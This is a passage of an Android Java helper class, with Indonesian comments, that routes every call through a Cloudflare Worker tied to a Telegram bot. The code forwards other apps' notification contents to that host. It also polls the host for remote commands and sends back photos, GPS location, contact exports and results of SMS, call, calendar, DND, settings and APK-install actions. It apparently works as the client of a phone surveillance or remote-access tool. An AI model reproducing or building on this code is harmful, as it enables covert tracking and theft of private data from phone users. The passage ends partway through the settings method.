package com.example.app;

import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

/**
 * API helper.
 *
 * SEMUA jalur (notifikasi, kamera, lokasi) sekarang lewat satu
 * pintu: Cloudflare Worker (WORKER_URL).
 *
 * Worker bertindak sebagai proxy TRANSPARAN ke Google Apps
 * Script: ia mengikuti redirect 302 yang selalu dikirim GAS Web
 * App, lalu meneruskan body & status ASLI dari GAS apa adanya
 * (baik untuk GET maupun POST) — tidak dibungkus format lain.
 *
 * Artinya bentuk response yang diterima di file ini SAMA PERSIS
 * seperti memanggil GAS langsung dengan redirect diikuti secara
 * manual, jadi semua parsing JSON di bawah membaca field
 * top-level langsung (mis. "status", "request"), TIDAK perlu
 * membongkar bungkusan tambahan apa pun.
 *
 * Endpoint GAS langsung (tanpa Worker) sengaja tidak lagi
 * dipakai di sini, supaya ada satu titik kontrol untuk masalah
 * 302/retry, dan supaya tidak ada dua pola respons berbeda yang
 * harus dijaga konsisten secara manual.
 */
public class ApiHelper {

    private static final String TAG = "ApiHelper";

    // =========================================================
    // SATU-SATUNYA ENDPOINT
    // Android -> Cloudflare Worker -> Apps Script
    // =========================================================

    private static final String WORKER_URL =
            "https://telegram-notification-bot.nadimmakarim641.workers.dev";

    private static final int CONNECT_TIMEOUT_MS = 15000;
    private static final int READ_TIMEOUT_MS = 20000;

    private ApiHelper() {
    }


    // =========================================================
    // NOTIFICATION
    // =========================================================

    /**
     * Mengirim satu notifikasi.
     *
     * Android -> Worker -> Apps Script (doPost, action=notification)
     * -> handleAndroidRequest() di Code.gs
     *
     * Worker meneruskan body & status ASLI dari GAS, jadi respons
     * di sini persis:
     * {"status":"success","action":"notification","packageName":"..."}
     */
    public static boolean sendNotificationToSheet(
            android.content.Context context,
            long timestamp,
            String packageName,
            String title,
            String messageText) {

        HttpURLConnection conn = null;

        try {

            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty(
                    "Content-Type",
                    "application/json; charset=utf-8"
            );
            conn.setRequestProperty(
                    "Accept",
                    "application/json, text/plain, */*"
            );
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action", "notification");
            json.put("timestamp", timestamp);
            json.put(
                    "packageName",
                    packageName == null ? "Unknown_App" : packageName
            );
            json.put(
                    "title",
                    title == null ? "Tanpa Judul" : title
            );
            json.put(
                    "message",
                    messageText == null ? "Tanpa Isi" : messageText
            );

            byte[] body = json.toString()
                    .getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream responseStream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(responseStream);

            Log.d(
                    TAG,
                    "Notification response: "
                            + responseCode
                            + " body="
                            + responseBody
            );

            if (responseCode < 200 || responseCode >= 300) {
                String detail =
                        "HTTP=" + responseCode
                                + ", body=" + limitForLog(responseBody);

                logDiagnostic(context, "API_HTTP_FAILED", detail);
                Log.e(TAG, "Notification HTTP failed: " + detail);
                return false;
            }

            if (responseBody == null || responseBody.trim().isEmpty()) {
                logDiagnostic(
                        context,
                        "API_RESPONSE_REJECTED",
                        "HTTP=2xx tetapi response kosong"
                );
                return false;
            }

            String trimmed = responseBody.trim();

            JSONObject appsScriptJson;
            try {
                appsScriptJson = new JSONObject(trimmed);
            } catch (Exception parseError) {
                String detail =
                        "HTTP=" + responseCode
                                + ", response bukan JSON=" + limitForLog(trimmed);

                logDiagnostic(context, "API_RESPONSE_REJECTED", detail);
                Log.e(TAG, "Invalid JSON response: " + detail, parseError);
                return false;
            }

            String status = appsScriptJson.optString("status", "");
            String action = appsScriptJson.optString("action", "");

            if (
                    "success".equalsIgnoreCase(status)
                            && (action.isEmpty()
                            || "notification".equalsIgnoreCase(action))
            ) {
                logDiagnostic(
                        context,
                        "API_ACCEPTED",
                        "status=success, action="
                                + (action.isEmpty() ? "(none)" : action)
                );
                return true;
            }

            String detail =
                    "status=" + status
                            + ", action=" + action
                            + ", response=" + limitForLog(trimmed);

            logDiagnostic(context, "API_APPS_SCRIPT_REJECTED", detail);
            Log.e(TAG, detail);
            return false;

        } catch (Exception e) {

            Log.e(TAG, "Error sending notification", e);
            logDiagnostic(context, "API_EXCEPTION", e.toString());
            return false;

        } finally {

            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    private static void logDiagnostic(
            android.content.Context context,
            String event,
            String detail) {
        if (context != null) {
            android.content.Context appContext =
                    context.getApplicationContext();

            DebugLogger.log(
                    appContext,
                    event,
                    detail
            );

            // Simpan detail kegagalan di Last Error juga, supaya
            // penyebab kegagalan tetap terlihat walaupun area
            // Event Log tidak tampil di layar.
            if (isFailureEvent(event)) {
                DebugLogger.setError(
                        appContext,
                        event + ": " + detail
                );
            } else if ("API_ACCEPTED".equals(event)) {
                DebugLogger.setError(
                        appContext,
                        "Tidak ada"
                );
            }
        }
    }

    private static boolean isFailureEvent(String event) {
        if (event == null) return false;

        return event.contains("FAILED")
                || event.contains("REJECTED")
                || event.contains("EXCEPTION")
                || event.contains("REDIRECT");
    }

    private static String limitForLog(String value) {
        if (value == null) return "";

        final int max = 1200;
        String normalized = value.replace('\n', ' ').replace('\r', ' ');

        if (normalized.length() <= max) {
            return normalized;
        }

        return normalized.substring(0, max) + "...";
    }


    // =========================================================
    // CAMERA
    // =========================================================

    /**
     * Cek satu pending camera request.
     *
     * Android -> Worker -> Apps Script (doGet, action=getCameraRequest)
     */
    public static JSONObject getPendingCameraRequest() {

        HttpURLConnection conn = null;

        try {

            URL url = new URL(WORKER_URL + "?action=getCameraRequest");

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty(
                    "Accept",
                    "application/json, text/plain, */*"
            );
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);

            int responseCode = conn.getResponseCode();

            InputStream responseStream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(responseStream);

            Log.d(
                    TAG,
                    "Camera request response: "
                            + responseCode
                            + " body="
                            + responseBody
            );

            if (
                    responseCode < 200 ||
                    responseCode >= 300 ||
                    responseBody == null ||
                    responseBody.trim().isEmpty()
            ) {
                return null;
            }

            return new JSONObject(responseBody);

        } catch (Exception e) {

            Log.e(TAG, "Error checking camera request", e);
            return null;

        } finally {

            if (conn != null) {
                conn.disconnect();
            }
        }
    }


    /**
     * Mengubah status request kamera.
     *
     * Android -> Worker -> Apps Script
     * (doPost, action=cameraRequestStatus)
     */
    public static boolean updateCameraRequestStatus(
            String requestId,
            String status) {

        if (requestId == null || requestId.trim().isEmpty()) {
            return false;
        }

        if (status == null || status.trim().isEmpty()) {
            return false;
        }

        HttpURLConnection conn = null;

        try {

            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty(
                    "Content-Type",
                    "application/json; charset=utf-8"
            );
            conn.setRequestProperty(
                    "Accept",
                    "application/json, text/plain, */*"
            );
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action", "cameraRequestStatus");
            json.put("requestId", requestId);
            json.put("status", status);

            byte[] body = json.toString()
                    .getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream responseStream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(responseStream);

            Log.d(
                    TAG,
                    "Camera status response: "
                            + responseCode
                            + " body="
                            + responseBody
            );

            if (responseCode < 200 || responseCode >= 300) {
                return false;
            }

            if (responseBody == null || responseBody.trim().isEmpty()) {
                return false;
            }

            try {
                JSONObject jsonResponse = new JSONObject(responseBody);
                return "success".equalsIgnoreCase(
                        jsonResponse.optString("status", "")
                );
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {

            Log.e(TAG, "Error updating camera request status", e);
            return false;

        } finally {

            if (conn != null) {
                conn.disconnect();
            }
        }
    }


    // =========================================================
    // CAMERA PHOTO UPLOAD
    // =========================================================

    /**
     * Upload satu foto yang telah diambil setelah pengguna
     * menekan "Ambil Foto".
     *
     * Android -> Worker -> Apps Script
     * (doPost, action=uploadCameraPhoto)
     */
    public static boolean uploadCapturedPhoto(
            String requestId,
            String camera,
            java.io.File photoFile) {

        if (requestId == null || requestId.trim().isEmpty()) {
            return false;
        }

        if (
                photoFile == null ||
                !photoFile.isFile() ||
                photoFile.length() <= 0
        ) {
            return false;
        }

        HttpURLConnection conn = null;

        try {

            // =================================================
            // READ PHOTO
            // =================================================

            byte[] photoBytes;

            try (
                    FileInputStream input = new FileInputStream(photoFile);
                    ByteArrayOutputStream output = new ByteArrayOutputStream()
            ) {

                byte[] buffer = new byte[8192];
                int count;

                while ((count = input.read(buffer)) != -1) {
                    output.write(buffer, 0, count);
                }

                photoBytes = output.toByteArray();
            }

            // =================================================
            // BASE64
            // =================================================

            String encodedPhoto =
                    Base64.encodeToString(photoBytes, Base64.NO_WRAP);

            // =================================================
            // WORKER -> APPS SCRIPT
            // =================================================

            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty(
                    "Content-Type",
                    "application/json; charset=utf-8"
            );
            conn.setRequestProperty(
                    "Accept",
                    "application/json, text/plain, */*"
            );
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action", "uploadCameraPhoto");
            json.put("requestId", requestId);
            json.put("camera", camera == null ? "" : camera);
            json.put("fileName", photoFile.getName());
            json.put("mimeType", "image/jpeg");
            json.put("photoBase64", encodedPhoto);

            byte[] body = json.toString()
                    .getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream responseStream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(responseStream);

            Log.d(
                    TAG,
                    "Photo upload response: "
                            + responseCode
                            + " body="
                            + responseBody
            );

            if (responseCode < 200 || responseCode >= 300) {
                return false;
            }

            if (responseBody == null || responseBody.trim().isEmpty()) {
                return false;
            }

            try {
                JSONObject response = new JSONObject(responseBody);
                return "success".equalsIgnoreCase(
                        response.optString("status", "")
                );
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {

            Log.e(TAG, "Error uploading captured photo", e);
            return false;

        } finally {

            if (conn != null) {
                conn.disconnect();
            }
        }
    }


    // =========================================================
    // LOCATION
    // =========================================================

    /**
     * Cek satu pending location request.
     *
     * Android -> Worker -> Apps Script
     * (doGet, action=getLocationRequest)
     */
    public static JSONObject getPendingLocationRequest() {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL + "?action=getLocationRequest");

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty(
                    "Accept",
                    "application/json, text/plain, */*"
            );
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String body = readResponse(stream);

            if (
                    responseCode < 200 || responseCode >= 300
                            || body == null || body.trim().isEmpty()
            ) {
                return null;
            }

            return new JSONObject(body);

        } catch (Exception e) {
            Log.e(TAG, "Error checking location request", e);
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Mengubah status request lokasi.
     *
     * Android -> Worker -> Apps Script
     * (doPost, action=locationRequestStatus)
     */
    public static boolean updateLocationRequestStatus(
            String requestId,
            String status) {

        if (requestId == null || requestId.trim().isEmpty()
                || status == null || status.trim().isEmpty()) {
            return false;
        }

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty(
                    "Content-Type",
                    "application/json; charset=utf-8"
            );
            conn.setRequestProperty(
                    "Accept",
                    "application/json, text/plain, */*"
            );
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action", "locationRequestStatus");
            json.put("requestId", requestId);
            json.put("status", status);

            byte[] body =
                    json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) {
                return false;
            }

            if (responseBody == null || responseBody.trim().isEmpty()) {
                return false;
            }

            try {
                JSONObject jsonResponse = new JSONObject(responseBody);
                return "success".equalsIgnoreCase(
                        jsonResponse.optString("status", "")
                );
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error updating location request status", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Mengirim hasil lokasi.
     *
     * Android -> Worker -> Apps Script (doPost, action=location)
     * -> handleLocationResult() di Code.gs
     */
    public static JSONObject sendLocationResult(
            String requestId,
            double latitude,
            double longitude,
            float accuracy,
            long timestamp) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty(
                    "Content-Type",
                    "application/json; charset=utf-8"
            );
            conn.setRequestProperty(
                    "Accept",
                    "application/json, text/plain, */*"
            );
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action", "location");
            json.put("requestId", requestId);
            json.put("latitude", latitude);
            json.put("longitude", longitude);

            if (Float.isNaN(accuracy)) {
                json.put("accuracy", JSONObject.NULL);
            } else {
                json.put("accuracy", accuracy);
            }

            json.put("timestamp", timestamp);

            byte[] body =
                    json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) {
                LocationDebugLogger.log(
                        null,
                        "LOCATION_HTTP_FAILED",
                        "HTTP=" + responseCode
                );
                return null;
            }

            if (responseBody == null || responseBody.trim().isEmpty()) {
                LocationDebugLogger.log(
                        null,
                        "LOCATION_RESPONSE_EMPTY",
                        "HTTP=" + responseCode
                );
                return null;
            }

            return new JSONObject(responseBody);

        } catch (Exception e) {
            Log.e(TAG, "Error sending location result", e);
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // UPDATE / INSTALL APK
    // =========================================================

    public static JSONObject getUpdateRequest() {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL + "?action=getUpdateRequest");

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String body = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300 ||
                    body == null || body.trim().isEmpty()) return null;

            return new JSONObject(body);

        } catch (Exception e) {
            Log.e(TAG, "Error getUpdateRequest", e);
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /** Kirim update progress ke GAS → diteruskan ke Telegram. */
    public static boolean sendUpdateProgress(
            String requestId, String message) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",    "updateProgress");
            json.put("requestId", requestId == null ? "" : requestId);
            json.put("message",   message == null ? "" : message);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            readResponse(stream);

            return responseCode >= 200 && responseCode < 300;

        } catch (Exception e) {
            Log.e(TAG, "Error sendUpdateProgress", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /** Kirim hasil akhir update ke GAS. */
    public static boolean sendUpdateResult(
            String requestId, boolean success, String message) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",    "updateResult");
            json.put("requestId", requestId == null ? "" : requestId);
            json.put("success",   success);
            json.put("message",   message == null ? "" : message);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) return false;

            try {
                return "success".equalsIgnoreCase(
                        new JSONObject(responseBody).optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sendUpdateResult", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // PHONE (SMS + CALL)
    // =========================================================

    public static JSONObject getPhoneRequest() {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL + "?action=getPhoneRequest");

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String body = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300 ||
                    body == null || body.trim().isEmpty()) return null;

            return new JSONObject(body);

        } catch (Exception e) {
            Log.e(TAG, "Error getPhoneRequest", e);
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    public static boolean sendPhoneResult(
            String requestId, boolean success, String message) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",    "phoneResult");
            json.put("requestId", requestId == null ? "" : requestId);
            json.put("success",   success);
            json.put("message",   message == null ? "" : message);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) return false;

            try {
                return "success".equalsIgnoreCase(
                        new JSONObject(responseBody).optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sendPhoneResult", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // CALENDAR
    // =========================================================

    public static JSONObject getCalendarRequest() {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL + "?action=getCalendarRequest");

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String body = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300 ||
                    body == null || body.trim().isEmpty()) return null;

            return new JSONObject(body);

        } catch (Exception e) {
            Log.e(TAG, "Error getCalendarRequest", e);
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Kirim hasil kalender ke GAS.
     * requestId kosong = push otomatis (reminder).
     */
    public static boolean sendCalendarResult(
            String requestId, String text) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",    "calendarResult");
            json.put("requestId", requestId == null ? "" : requestId);
            json.put("text",      text == null ? "" : text);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) return false;

            try {
                return "success".equalsIgnoreCase(
                        new JSONObject(responseBody).optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sendCalendarResult", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // DND
    // =========================================================

    public static JSONObject getDndRequest() {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL + "?action=getDndRequest");

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String body = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300 ||
                    body == null || body.trim().isEmpty()) return null;

            return new JSONObject(body);

        } catch (Exception e) {
            Log.e(TAG, "Error getDndRequest", e);
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    public static boolean sendDndResult(
            String requestId, boolean success, String message) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",    "dndResult");
            json.put("requestId", requestId == null ? "" : requestId);
            json.put("success",   success);
            json.put("message",   message == null ? "" : message);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) return false;

            try {
                return "success".equalsIgnoreCase(
                        new JSONObject(responseBody).optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sendDndResult", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // CONTACT
    // =========================================================

    public static JSONObject getContactRequest() {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL + "?action=getContactRequest");

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String body = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300 ||
                    body == null || body.trim().isEmpty()) return null;

            return new JSONObject(body);

        } catch (Exception e) {
            Log.e(TAG, "Error getContactRequest", e);
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Kirim hasil operasi kontak ke GAS.
     * - text: pesan teks biasa (search/add/delete/count)
     * - vcfBase64: data VCF ter-encode (untuk export), null jika tidak ada
     */
    public static boolean sendContactResult(
            String requestId,
            String operation,
            String text,
            String vcfBase64) {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(90000);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("action",    "contactResult");
            json.put("requestId", requestId == null ? "" : requestId);
            json.put("operation", operation == null ? "" : operation);
            json.put("text",      text       == null ? "" : text);
            json.put("vcfBase64", vcfBase64  == null ? "" : vcfBase64);

            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String responseBody = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300) return false;

            try {
                return "success".equalsIgnoreCase(
                        new JSONObject(responseBody).optString("status", ""));
            } catch (Exception ignored) {
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error sendContactResult", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // =========================================================
    // SETTINGS
    // =========================================================

    public static JSONObject getSettingsRequest() {

        HttpURLConnection conn = null;

        try {
            URL url = new URL(WORKER_URL + "?action=getSettingsRequest");

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
            conn.setReadTimeout(READ_TIMEOUT_MS);

            int responseCode = conn.getResponseCode();

            InputStream stream =
                    (responseCode >= 200 && responseCode < 300)
                            ? conn.getInputStream()
                            : conn.getErrorStream();

            String body = readResponse(stream);

            if (responseCode < 200 || responseCode >= 300 ||
                    body == null || body.trim().isEmpty()) return null;

            return new JSONObject(body);

